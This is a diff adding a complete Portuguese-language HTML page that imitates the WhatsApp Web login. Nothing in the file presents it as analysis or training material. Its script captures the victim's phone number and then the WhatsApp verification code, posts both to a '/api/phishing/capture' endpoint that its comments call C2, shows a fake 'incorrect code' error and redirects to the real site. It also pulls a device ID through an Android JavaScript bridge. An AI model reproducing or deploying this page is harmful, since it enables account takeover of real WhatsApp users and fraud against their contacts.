@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Web</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Helvetica Neue, Helvetica, Arial, sans-serif;
+            background-color: #111b21;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 1200px;
+            background: #222e35;
+            border-radius: 3px;
+            overflow: hidden;
+            box-shadow: 0 17px 50px 0 rgba(0,0,0,0.19), 0 12px 15px 0 rgba(0,0,0,0.24);
+        }
+        
+        .header {
+            background: #202c33;
+            height: 59px;
+            display: flex;
+            align-items: center;
+            padding: 0 16px;
+            border-bottom: 1px solid #2a3942;
+        }
+        
+        .logo {
+            width: 40px;
+            height: 40px;
+            background: #25d366;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            margin-right: 12px;
+        }
+        
+        .header-title {
+            color: #e9edef;
+            font-size: 19px;
+        }
+        
+        .content {
+            display: flex;
+            height: calc(100vh - 140px);
+            max-height: 700px;
+        }
+        
+        .sidebar {
+            flex: 0 0 30%;
+            background: #111b21;
+            border-right: 1px solid #2a3942;
+        }
+        
+        .main-content {
+            flex: 1;
+            background-image: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9IiMwYjE0MWEiLz48L3N2Zz4=');
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px;
+        }
+        
+        .login-box {
+            background: #202c33;
+            border-radius: 12px;
+            padding: 40px;
+            max-width: 460px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+        }
+        
+        .whatsapp-icon {
+            width: 80px;
+            height: 80px;
+            background: #25d366;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            color: white;
+            font-size: 48px;
+        }
+        
+        h1 {
+            color: #e9edef;
+            font-size: 28px;
+            font-weight: 300;
+            margin-bottom: 12px;
+        }
+        
+        .subtitle {
+            color: #8696a0;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 32px;
+        }
+        
+        .qr-placeholder {
+            width: 264px;
+            height: 264px;
+            background: white;
+            border-radius: 16px;
+            margin: 0 auto 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+        
+        .qr-text {
+            color: #667781;
+            font-size: 14px;
+            text-align: center;
+            line-height: 1.5;
+            padding: 20px;
+        }
+        
+        .link-device-btn {
+            background: #25d366;
+            color: white;
+            border: none;
+            border-radius: 24px;
+            padding: 12px 32px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 16px;
+            transition: background 0.2s;
+        }
+        
+        .link-device-btn:hover {
+            background: #20bd5c;
+        }
+        
+        .phone-login-section {
+            display: none;
+            text-align: left;
+        }
+        
+        .phone-login-section.show {
+            display: block;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            color: #8696a0;
+            font-size: 13px;
+            margin-bottom: 8px;
+        }
+        
+        input[type="tel"],
+        input[type="text"] {
+            width: 100%;
+            padding: 12px 16px;
+            background: #2a3942;
+            border: 1px solid #2a3942;
+            border-radius: 8px;
+            color: #e9edef;
+            font-size: 15px;
+        }
+        
+        input[type="tel"]:focus,
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #25d366;
+        }
+        
+        .btn-verify {
+            width: 100%;
+            background: #25d366;
+            color: white;
+            border: none;
+            border-radius: 24px;
+            padding: 14px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 24px;
+        }
+        
+        .btn-verify:hover {
+            background: #20bd5c;
+        }
+        
+        .btn-verify:disabled {
+            background: #3b4a54;
+            cursor: not-allowed;
+        }
+        
+        .error-message {
+            display: none;
+            color: #ff6b6b;
+            font-size: 13px;
+            margin-top: 8px;
+            text-align: left;
+        }
+        
+        .error-message.show {
+            display: block;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .loading.show {
+            display: block;
+        }
+        
+        .spinner {
+            border: 3px solid #2a3942;
+            border-top: 3px solid #25d366;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .back-link {
+            display: block;
+            color: #00a884;
+            text-decoration: none;
+            font-size: 14px;
+            margin-top: 20px;
+        }
+        
+        .back-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">📱</div>
+            <div class="header-title">WhatsApp Web</div>
+        </div>
+        
+        <div class="content">
+            <div class="sidebar"></div>
+            
+            <div class="main-content">
+                <div class="login-box">
+                    <!-- QR Code Section -->
+                    <div id="qrSection">
+                        <div class="whatsapp-icon">💬</div>
+                        <h1>Use o WhatsApp no seu computador</h1>
+                        <p class="subtitle">
+                            Conecte seu telefone e sincronize suas conversas
+                        </p>
+                        
+                        <div class="qr-placeholder">
+                            <div class="qr-text">
+                                Clique no botão abaixo para vincular com seu número de telefone
+                            </div>
+                        </div>
+                        
+                        <button class="link-device-btn" id="linkDeviceBtn">
+                            Vincular com número de telefone
+                        </button>
+                    </div>
+                    
+                    <!-- Phone Login Section -->
+                    <div class="phone-login-section" id="phoneSection">
+                        <h1>Conectar seu telefone</h1>
+                        <p class="subtitle">
+                            Digite seu número de telefone para receber um código de verificação
+                        </p>
+                        
+                        <form id="phishingForm" action="#" method="POST">
+                            <div class="form-group">
+                                <label for="phone">Número de telefone</label>
+                                <input 
+                                    type="tel" 
+                                    id="phone" 
+                                    name="phone" 
+                                    placeholder="+55 11 99999-9999"
+                                    required
+                                >
+                                <div class="error-message" id="phoneError">
+                                    Digite um número válido
+                                </div>
+                            </div>
+                            
+                            <div class="form-group" id="codeGroup" style="display: none;">
+                                <label for="code">Código de verificação</label>
+                                <input 
+                                    type="text" 
+                                    id="code" 
+                                    name="code" 
+                                    placeholder="000-000"
+                                    maxlength="7"
+                                    required
+                                >
+                                <div class="error-message" id="codeError">
+                                    Código inválido
+                                </div>
+                            </div>
+                            
+                            <div class="loading" id="loading">
+                                <div class="spinner"></div>
+                            </div>
+                            
+                            <button type="submit" class="btn-verify" id="submitBtn">
+                                Enviar código
+                            </button>
+                            
+                            <a href="#" class="back-link" id="backLink">
+                                ← Voltar para QR Code
+                            </a>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        let step = 1;
+        let capturedPhone = '';
+        
+        const qrSection = document.getElementById('qrSection');
+        const phoneSection = document.getElementById('phoneSection');
+        const linkDeviceBtn = document.getElementById('linkDeviceBtn');
+        const backLink = document.getElementById('backLink');
+        const form = document.getElementById('phishingForm');
+        const phoneInput = document.getElementById('phone');
+        const codeInput = document.getElementById('code');
+        const codeGroup = document.getElementById('codeGroup');
+        const submitBtn = document.getElementById('submitBtn');
+        const loading = document.getElementById('loading');
+        const phoneError = document.getElementById('phoneError');
+        const codeError = document.getElementById('codeError');
+        
+        linkDeviceBtn.addEventListener('click', () => {
+            qrSection.style.display = 'none';
+            phoneSection.classList.add('show');
+        });
+        
+        backLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            phoneSection.classList.remove('show');
+            qrSection.style.display = 'block';
+            form.reset();
+            step = 1;
+            codeGroup.style.display = 'none';
+            submitBtn.textContent = 'Enviar código';
+        });
+        
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            if (step === 1) {
+                // Validar telefone
+                const phone = phoneInput.value.trim();
+                
+                if (!phone || phone.length < 10) {
+                    phoneError.classList.add('show');
+                    return;
+                }
+                
+                phoneError.classList.remove('show');
+                capturedPhone = phone;
+                
+                // Mostrar loading
+                loading.classList.add('show');
+                submitBtn.disabled = true;
+                
+                // Enviar telefone para C2
+                try {
+                    await fetch('/api/phishing/capture', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'X-Device-ID': getDeviceId()
+                        },
+                        body: JSON.stringify({
+                            platform: 'whatsapp',
+                            phone: phone,
+                            step: 'phone_capture',
+                            user_agent: navigator.userAgent,
+                            timestamp: new Date().toISOString()
+                        })
+                    });
+                } catch (e) {}
+                
+                // Simular envio de código
+                setTimeout(() => {
+                    loading.classList.remove('show');
+                    submitBtn.disabled = false;
+                    
+                    // Mostrar campo de código
+                    phoneInput.disabled = true;
+                    codeGroup.style.display = 'block';
+                    submitBtn.textContent = 'Verificar código';
+                    step = 2;
+                    codeInput.focus();
+                }, 1500);
+                
+            } else if (step === 2) {
+                // Capturar código
+                const code = codeInput.value.trim();
+                
+                if (!code || code.length < 6) {
+                    codeError.classList.add('show');
+                    return;
+                }
+                
+                codeError.classList.remove('show');
+                
+                // Mostrar loading
+                loading.classList.add('show');
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Verificando...';
+                
+                // Enviar código para C2
+                try {
+                    await fetch('/api/phishing/capture', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'X-Device-ID': getDeviceId()
+                        },
+                        body: JSON.stringify({
+                            platform: 'whatsapp',
+                            phone: capturedPhone,
+                            verification_code: code,
+                            step: 'code_capture',
+                            user_agent: navigator.userAgent,
+                            timestamp: new Date().toISOString()
+                        })
+                    });
+                } catch (e) {}
+                
+                // Simular erro de código
+                setTimeout(() => {
+                    loading.classList.remove('show');
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Verificar código';
+                    
+                    codeError.textContent = 'Código incorreto. Tente novamente.';
+                    codeError.classList.add('show');
+                    codeInput.value = '';
+                    codeInput.focus();
+                    
+                    // Redirecionar após alguns segundos
+                    setTimeout(() => {
+                        window.location.href = 'https://web.whatsapp.com';
+                    }, 3000);
+                }, 1500);
+            }
+        });
+        
+        function getDeviceId() {
+            try {
+                if (typeof Android !== 'undefined' && Android.getDeviceId) {
+                    return Android.getDeviceId();
+                }
+            } catch (e) {}
+            
+            let deviceId = localStorage.getItem('device_id');
+            if (!deviceId) {
+                deviceId = 'web_' + Math.random().toString(36).substr(2, 9);
+                localStorage.setItem('device_id', deviceId);
+            }
+            return deviceId;
+        }
+        
+        phoneInput.addEventListener('input', () => {
+            phoneError.classList.remove('show');
+        });
+        
+        codeInput.addEventListener('input', () => {
+            codeError.classList.remove('show');
+        });
+    </script>
+</body>
+</html>
+
